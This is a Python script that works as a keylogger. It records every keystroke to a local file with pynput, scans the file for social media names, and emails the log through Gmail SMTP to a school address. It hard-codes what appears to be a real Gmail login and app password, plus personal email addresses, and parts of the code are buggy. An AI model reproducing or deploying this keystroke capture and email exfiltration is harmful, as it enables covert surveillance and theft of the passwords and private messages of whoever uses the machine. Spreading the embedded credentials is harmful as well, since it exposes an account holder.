from pynput.keyboard import Listener

def remove_last_letter_from_file(file_path):
    # Open the file in read mode to read its content
    with open(file_path, 'r') as f:
        content = f.read()

    # Check if the content is not empty
    if content:
        # Truncate the file to remove the last character
        with open(file_path, 'w') as f:
            f.write(content[:-1])

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        # Call the function to remove the last letter from the file
        remove_last_letter_from_file("log.txt")
        return  # Skip writing to the file for backspace
    if letter == "Key.cmdw":
        letter == 'Tab closed'

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()

def clear_file(file_path):
    # Open the file in write mode to clear its content
    with open(file_path, 'w') as f:
        # Write an empty string to the file
        f.write('')


file_path = 'log.txt'
clear_file(file_path)

def find_social_media_platforms(file_path):
    # List of known social media platforms
    social_media_platforms = ["facebook", "twitter", "instagram", "netlfix", "snapchat", "youtube","amazon"]

    # Open the file in read mode
    with open(file_path, 'r') as file:
        # Read each line in the file
        for line in file:
            # Remove leading and trailing whitespaces
            name = line.strip().lower()

            # Check if the name corresponds to a known social media platform
            if name in social_media_platforms:
                print(f"Found social media platform: {name}")

file_path = 'log.txt'
find_social_media_platforms(file_path)

def check_file_length(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            content = file.read()
            if len(content) > 250:
                print("Too busy on laptop")
            else:
                print("File length is within the acceptable range.")
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Replace 'your_file.txt' with the actual path to your text file
check_file_length('log.txt')

####################

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


def send_email(subject, body, to_email, attachment_path=None):
    # Create an MIMEMultipart object
    msg = MIMEMultipart()

    # Set the email subject
    msg['Subject'] = subject

    # Attach the email body as text
    msg.attach(MIMEText(body, 'plain'))

    # If an attachment path is provided, attach the file
    if attachment_path:
        with open("log.txt", "rb") as attachment:
            # Create an MIMEApplication object for the attachment
            part = MIMEApplication(attachment.read(), Name="log.txt")
            # Set the Content-Disposition header to specify the file name
            part['log.txt'] = f'attachment; filename="{"log.txt"}"'
            # Attach the file to the email
            msg.attach(part)

    # Create an SMTP object and connect to the Gmail server
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # Start TLS (Transport Layer Security) encryption for a secure connection
    s.starttls()

    try:
        # Log in to the Gmail account with the provided credentials
        s.login("instantjob0@gmail.com", "cwmtrjmmnlhmfnez")

        # Send the email using the sendmail method, providing sender, recipient, and the email message
        s.sendmail("instantjob0@gmail.com", to_email, msg.as_string())

        print("Email sent successfully.")

        return True
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        # Close the connection to the SMTP server
        s.quit()


# Example usage with an attachment
email_subject = "Test Email with Attachment"
email_body = "Hello, this is a test email with an attachment."
recipient_email = "t00120@reading-school.co.uk"
attachment_file_path = "/Users/manumaddi/log.txt"

send_email(email_subject, email_body, recipient_email, attachment_file_path)

